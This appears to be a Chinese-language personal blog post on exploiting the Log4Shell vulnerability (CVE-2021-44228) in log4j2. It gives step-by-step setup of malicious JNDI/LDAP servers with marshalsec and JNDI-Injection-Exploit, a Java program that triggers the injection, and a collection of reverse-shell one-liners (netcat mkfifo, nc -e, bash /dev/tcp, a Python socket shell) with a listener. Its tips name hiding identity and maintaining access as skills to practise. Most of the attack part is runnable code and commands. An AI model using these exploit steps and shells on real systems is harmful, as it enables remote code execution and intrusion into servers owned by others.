---
title: CVE-2021-44228
date: 2021-12-13 21:27:06
tags:
---


漏洞详情
-----
### 受影响的版本
all log4j-core versions >=2.0-beta9 and <=2.14.1
### 基本原理
由于对应版本的log4j2中，打印日志时会通过JNDI请求LDAP数据来构造更精美的日志输出，而如果用户输入的内容包含${jndi:ldap://host:port/exp}，则会被log4j2获取并执行，只要运行一个恶意的JNDI服务器，在含有该漏洞的地方注入这段代码，那么将会以运行该Java程序的用户权限执行该指令（RCE）
### exploit
#### 构建后端恶意JDNI服务（方法1）：
1. 编译Exploit.java为字节码，同目录下使用python3的http服务器，这一步是为了让受影响的服务器远程获取我们需要执行的恶意代码
```
javac Exploit.java
python3 -m http.server 8888
```
2. 使用marshalsec来创建一个恶意的JNDI服务
```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Exploit"
```

#### 构建后端恶意JDNI服务（方法2）：[JNDI Injection Exploit](https://github.com/welk1n/JNDI-Injection-Exploit)
```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "touch /tmp/pwned"
```

#### 简单构造存在漏洞的java+log4j2环境
```
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


public class log4j {
    private static final Logger logger = LogManager.getLogger(log4j.class);

    public static void main(String[] args) {
        //高版本的jdk默认trustURLCodebase为false，因此不能成功利用JNDI注入
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        logger.error("${jndi:ldap://127.0.0.1:1389/Exploit}");
    }
}
```
运行即可触发漏洞，受害者把本该打印的文本内容作为JNDI解析，获取远程服务器的Java字节码，并在本地执行（可以直接反弹shell）

### Tips
+ 本地exp没有问题，远程exp有问题（尝试各个网络位置，各种jdk版本，最后换了一个恶意JNDI完事）
+ 从尝试echo hello world没反应到尝试touch /tmp/pwned再到反弹shell
+ 使用JNDI injection exploit来搭建恶意JNDI服务器来利用漏洞，不要用上面github仓库那个方法，会遇到超多问题（例如：java版本不对，没法远程利用，reference class name: foo，或者jdk1.8需要maven构建，又是一堆问题，不要尝试，直接使用下面这个repo来exp）[JNDI Injection Exploit](https://github.com/welk1n/JNDI-Injection-Exploit)
+ 命令会被作为参数传入Runtime.getRuntime().exec()，所以需要确保命令传入exec()方法可执行。（使用bash -c "echo hello > /tmp/pwned"等）

反弹shell
-----
### 攻击方
```
nc -vnl 2222
```

### 受害者

#### Netcat
```
rm /tmp/f && mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc 127.0.0.1 2222 > /tmp/f
```
或者
```
nc 127.0.0.1 2222 -e /bin/bash
```
#### Bash
```
bash -c 'bash -i >& /dev/tcp/127.0.0.1/2222 0>&1'
```
#### Python
+ 源代码
```
import os, socket, subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 2222))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
p=subprocess.call(['/bin/bash', '-i'])
```
+ 命令行直接执行
```
python -c \"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('127.0.0.1',2222));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash', '-i'])\"
```

工具总结
-----
+ Java, JDK：高版本可能存在问题，尽量使用低版本（***插入图片***）
+ maven：使用pom.xml构建Java工程（***插入图片***）
+ log4j：日志管理工具
+ dnslog：接受带出来的访问信息
+ make：精简测试
+ tmux：分屏同时测试
+ github：创建repo来记录

技术总结
-----
### 漏洞的生命周期
+ 漏洞一直存在（无人发现）
+ 黑客发现0day自己保存
+ 漏洞公开，exp简单，伤害性大，影响范围极广（性价比高，范围广）
+ 缓解方法出现
+ 补丁出现，大家开始修复漏洞
+ 漏洞影响范围降低，但仍有漏网之鱼

### Log4Shell时间线
|日期|事件|
|----|----|
|2021-12-09|曝出漏洞，掀起话题|
|2021-12-10|开始出现大量exp|
|2021-12-11|bbs elastic search，熬夜本地exp成功（远程exp不行）|
|2021-12-12|还是不行，找到其他恶意JNDI，继续尝试|
|2021-12-13|远程exp成功，反弹shell成功（但不能任意反弹shell）|

### 一些知名漏洞
|Name|service|CVE|
|----|-------|---|
|Heartbleed|openssl|CVE-2014-0160|
|Eternalblue|smb|CVE-2017-0144(MS17-010)|
|BlueKeep|rdp|CVE-2019-0708|
|Log4Shell|log4j2|CVE-2021-44228|

### Tips
+ 今后要重点加强的内容，不能机会来了才磨剑（隐匿身份、维持访问、反弹shell、尝试并分类总结各种漏洞）
+ 测试基本功能后，再深入（如dnslog能不能用，）
+ 明确攻击方和防守方的边界
+ 写博客所感
	+ 初学者使用vim时千万不要同时开着中文输入法，会彻底毁掉你对vim的好感！！！
	+ markdown的每个段落后需要有个分段，不然格式会乱

参考资源
-----
+ [Github Stargazer](https://starchart.cc/)
+ [maven plugin error](https://stackoverflow.com/questions/32368758/log4j2-java-lang-noclassdeffounderror-org-apache-logging-log4j-logmanager)
+ [https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce0](https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce0)
